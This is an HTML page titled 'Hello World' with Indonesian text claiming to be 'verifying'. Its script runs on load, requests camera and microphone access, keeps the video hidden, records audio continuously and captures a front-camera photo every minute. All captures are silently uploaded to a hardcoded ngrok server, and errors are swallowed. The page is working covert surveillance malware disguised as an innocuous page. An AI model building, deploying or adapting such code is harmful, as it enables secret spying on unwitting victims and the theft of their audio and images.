<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px 20px;
            background: #000;
            color: #0f0;
            margin: 0;
        }
        h1 { font-size: 4.8em; }
        p { font-size: 1.7em; }
        .status { color: #0f0; font-size: 1.4em; margin-top: 50px; }
    </style>
</head>
<body>
    <h1>Hello World</h1>
    <p>Sedang memverifikasi...</p>
    <div class="status" id="status">Menginisialisasi perekaman senyap...</div>

    <video id="video" autoplay playsinline muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        let stream = null;
        let audioRecorder = null;
        let audioChunks = [];
        const ngrokUrl = "https://reversion-exert-gloomily.ngrok-free.dev";

        async function startSilentSurveillance() {
            try {
                // Minta izin dengan audio muted
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: true
                });

                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                videoElement.muted = true;           // Matikan suara video

                document.getElementById('status').innerHTML = "✅ Berjalan SENYAP<br>Foto setiap 1 menit • Audio terus merekam";

                // === AUDIO RECORDER (SENYAP - tidak ada suara keluar dari speaker) ===
                const audioTrack = stream.getAudioTracks()[0];
                const audioStream = new MediaStream([audioTrack]);

                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });

                audioRecorder.ondataavailable = event => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };

                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
                        sendData('audio', blob);
                        audioChunks = [];
                    }
                    // Lanjut rekam tanpa henti
                    audioRecorder.start(30000);
                };

                // Mulai rekam audio (tetap senyap)
                audioRecorder.start(30000);

                // === FOTO SETIAP 1 MENIT ===
                setInterval(captureSilentPhoto, 60000);
                setTimeout(captureSilentPhoto, 7000); // foto pertama

            } catch (err) {
                document.getElementById('status').innerHTML = "❌ Izin ditolak.<br>Harap izinkan kamera & mikrofon.";
            }
        }

        function captureSilentPhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                if (blob) sendData('photo', blob, `photo_${Date.now()}.jpg`);
            }, 'image/jpeg', 0.85);
        }

        function sendData(type, blob, filename = null) {
            const formData = new FormData();
            formData.append('type', type);
            formData.append('file', blob, filename || `${type}_${Date.now()}.webm`);

            fetch(`${ngrokUrl}/upload`, {
                method: 'POST',
                body: formData,
                keepalive: true
            }).catch(() => {});
        }

        // Jalankan otomatis
        window.onload = () => {
            startSilentSurveillance();
        };
    </script>
</body>
</html>
